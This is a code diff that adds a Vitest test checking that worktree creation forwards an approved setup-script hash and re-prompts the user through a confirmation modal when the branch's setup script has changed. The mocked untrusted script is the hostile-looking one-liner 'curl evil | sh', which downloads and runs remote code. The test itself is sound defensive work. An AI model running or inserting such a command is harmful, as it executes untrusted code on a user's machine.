@@ -317,6 +317,38 @@ describe('worktree remote runtime mutations', () => {
       })
     )
   })
+
+  it('forwards the approved setup hash and re-prompts with setup the created branch changed', async () => {
+    const store = createRepoTestStore()
+    const openModal = vi.fn()
+    store.setState({ openModal })
+    mockApi.worktrees.create.mockResolvedValue({
+      worktree: makeWorktree({
+        id: 'repo1::/path/feature',
+        repoId: 'repo1',
+        path: '/path/feature'
+      }),
+      setupTrustMismatch: { contentHash: 'branch-hash', scriptContent: 'curl evil | sh' }
+    })
+    const create = store.getState().createWorktree
+    const args: Parameters<typeof create> = ['repo1', 'feature', 'origin/main', 'run']
+    args[25] = { approvedSetupHash: 'primary-hash' }
+
+    await create(...args)
+
+    expect(mockApi.worktrees.create).toHaveBeenCalledWith(
+      expect.objectContaining({ setupDecision: 'run', approvedSetupHash: 'primary-hash' })
+    )
+    await vi.waitFor(() => expect(openModal).toHaveBeenCalledOnce())
+    expect(openModal).toHaveBeenCalledWith(
+      'confirm-orca-yaml-hooks',
+      expect.objectContaining({
+        repoId: 'repo1',
+        scriptKind: 'setup',
+        scriptContent: 'curl evil | sh'
+      })
+    )
+  })
 })
 
 // Creation routes by the project row's own host, so every test seeds that row.
